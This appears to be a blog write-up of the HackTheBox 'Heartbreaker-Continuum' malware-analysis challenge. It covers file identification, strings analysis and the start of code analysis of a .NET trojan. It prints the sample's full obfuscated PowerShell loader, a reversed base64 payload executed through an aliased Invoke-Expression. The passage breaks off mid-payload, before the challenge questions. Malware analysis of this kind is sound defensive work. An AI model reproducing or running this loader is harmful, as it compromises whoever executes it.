---
layout: post
title:  "HackTheBox Heartbreaker-Continuum Malware Analysis Writeup"
date:   2024-11-29 +0800
categories: write-up
---
<link rel="stylesheet" href="/assets/main.css">

# Table of Contents
1. [Introduction](#introduction)
2. [Analysis](#analysis)
2. [Question 1](#question-1)
3. [Question 2](#question-2)
4. [Question 3](#question-3)
5. [Question 4](#question-4)
6. [Question 5](#question-5)
7. [Question 6](#question-6)
8. [Question 7](#question-7)
9. [Question 8](#question-8)
10. [Question 9](#question-9)
11. [Question 10](#question-10)
12. [Question 11](#question-11)
14. [Conclusion](#conclusion)

# Introduction
This is a writeup for the "Heartbreaker-Continuum" Sherlock machine on HackTheBox. This is a Malware Analysis Sherlock where we are given an executable and must answer some questions about it. This machine is considered easy, however I'd recommend you come in with at least some basic knowlege of malware analysis before giving this one a go.

This writeup will first encompass my in-depth analysis of the provided sample, then I will go through each of the Sherlock questions and walkthrough how I derrived the answers. I will be conducting my analysis within [Remnux](https://remnux.org/), a Ubuntu-based Linux distro designed for malware analysis. **Always conduct malware analysis within a virtual machine/sandboxed environment.** Additionally, when analysing Windows-based malware it is much safer to do so within a non-Windows environment (unless you are conducting dynamic analysis).

To begin, download the password-protected zip file `heartbreaker-continuum.zip` into your analysis environment. To unzip it, we can use 7zip `7z x heartbreaker_continuum.zip -p<password>`. This will extract the contents to the current directory. We cab now begin analysis.

# Analysis
## File Info
To start, lets get some basic information on the file, to do this commandline utilities like `md5sum` and `file` can give some valuable information about the file. Additionally, uploading to a site like [VirusTotal](https://virustotal.com) can give some more insight into the nature of the file.
### General
- **Name:** Superstar_MemberCard.tiff.exe
- **File Type:** PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows.
- **Size:** 40KB
### Hashes
- **MD5:** ace3e42d95e5b9d0744763bde9888069
- **SHA256:** 12daa34111bb54b3dcbad42305663e44e7e6c3842f015cccbbe6564d9dfd3ea3
- **Imphash:** f34d5f2d4577ed6d9ceec516c1f5a744
### VirusTotal
**[Analysis Link](https://www.virustotal.com/gui/file/12daa34111bb54b3dcbad42305663e44e7e6c3842f015cccbbe6564d9dfd3ea3)**

![VirusTotal screenshot.](/assets/images/HeartBreaker-Continuum/Screenshot_2024-11-29-202251.png)
- **Detections:** 54/72
- **Classification:** trojan.powershell/msil

After gaining some valuable insight into the file, we now know that the file is a PE32 executable (.exe file) written in .NET. Additionally, the VirusTotal analysis confirms that this is a malicious executable and also reveals that this may have some PowerShell at some stage.
## Strings
Strings analysis may reveal more information about the executable, such as any signatures or IOCs that could be used for detection. The commandline tool `strings` will pull out any plaintext strings within the executable and display them. However, I prefer to use the tool `floss` which is "The FLARE team's open-source tool to extract ALL strings from malware." (essentially `strings` *but better*). 

Observing the strings on this executable provides some very interesting results

Firstly, we can see what looks to be a large base64 encoded string:
![Base64 encoded string.](/assets/images/HeartBreaker-Continuum/Screenshot_2024-11-29-203448.png)

Scrolling further down, it appears that this base64 encoded string is actually apart of a PowerShell script. Which makes sense given the classification "trojan.powershell/msil" given by VirusTotal.
![PowerShell script hidden in strings.](/assets/images/HeartBreaker-Continuum/Screenshot_2024-11-29-203509.png)

Pulling out the full PowerShell script gives us the following code to work with:
```PowerShell
$sCrt = "==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" ;
$enC = $sCrt.ToCharArray() ; [array]::Reverse($enC) ; -join $enC 2>&1> $null ;
$bOom = [sYsTeM.tExT.eNcOdInG]::uTf8.GeTsTrInG([sYsTeM.cOnVeRt]::fRoMbASe64sTrInG("$enC")) ;
$iLy = "iNv"+"OKe"+"-Ex"+"PrE"+"SsI"+"On" ; NeW-AliAs -NaMe ilY -VaLuE $iLy -FoRcE ; ilY $bOom ;
```
Additionally, we can see a reference to a `.ps1` file:

![PowerShell script name newILY.ps1](/assets/images/HeartBreaker-Continuum/Screenshot_2024-11-29-203603.png)

It's likely that this `newILY.ps1` was the original filename for this PowerShell script.

Now that we've pulled an entire PowerShell script out of the executable's strings we can move onto some code analysis and try to understand what this sample does.
## Code Analysis
Observing the PowerShell script that we obtained, it appears the base64 encoded string is actually backwards (base64 strings typicaly end in an '=' sign, whereas here we see them at the start). Reading into the script confirms this

```powershell
$enC = $sCrt.ToCharArray() ; [array]::Reverse($enC) ; -join $enC 2>&1> $null ;
```
Here we see the base64 `$sCrt` is stored in a character array and reversed. To do this ourselves we can copy this part of the script into our own PowerShell script and print the output.

```powershell
$sCrt = "==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